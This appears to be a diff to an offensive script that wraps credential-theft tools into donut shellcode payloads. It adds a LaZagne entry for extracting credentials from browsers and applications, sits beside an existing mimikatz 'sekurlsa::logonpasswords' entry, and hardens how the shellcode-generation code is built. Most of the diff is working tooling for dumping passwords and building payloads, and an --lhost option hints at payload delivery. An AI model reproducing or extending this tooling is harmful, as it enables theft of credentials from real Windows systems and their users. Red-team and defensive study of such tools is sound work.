@@ -13,6 +13,7 @@ Usage:
 
 import argparse
 import base64
+import json
 import os
 import subprocess
 import sys
@@ -124,6 +125,16 @@ TOOLS = {
         "default_params": "privilege::debug sekurlsa::logonpasswords exit",
         "desc": "Credential extraction (native PE)",
     },
+    "lazagne": {
+        "paths": [
+            "{script_dir}/tools/windows/lazagne.exe",
+            "/opt/killshot/tools/windows/lazagne.exe",
+            "/opt/my-resources/tools/windows/lazagne.exe",
+            "/opt/resources/windows/LaZagne/lazagne.exe",
+        ],
+        "default_params": "all",
+        "desc": "Multi-browser/app credential extraction",
+    },
 }
 
 
@@ -174,14 +185,11 @@ def generate(tool_name, params, output_path, script_dir):
     with tempfile.NamedTemporaryFile(suffix='.bin', delete=False) as tmp:
         tmp_path = tmp.name
 
-    # Escape single quotes in params for Python string
-    safe_params = params.replace("'", "\\'")
-
     donut_code = f"""
 import donut
-sc = donut.create(file='{tool_path}', arch=2, params='''{safe_params}''', exit_opt=2)
+sc = donut.create(file={json.dumps(tool_path)}, arch=2, params={json.dumps(params)}, exit_opt=2)
 if sc:
-    with open('{tmp_path}', 'wb') as f:
+    with open({json.dumps(tmp_path)}, 'wb') as f:
         f.write(sc)
     print(f'OK {{len(sc)}}')
 else:
@@ -224,7 +232,7 @@ if __name__ == '__main__':
                         help='Tool arguments (overrides defaults)')
     parser.add_argument('--output', '-o', default=None, help='Output .enc file path')
     parser.add_argument('--script-dir', '-s', default='.', help='Script directory')
-    parser.add_argument('--list', '-l', action='store_true', help='List available tools')
+    parser.add_argument('--list', action='store_true', help='List available tools')
     parser.add_argument('--all', '-a', action='store_true',
                         help='Generate all available tools')
     parser.add_argument('--lhost', default=None,
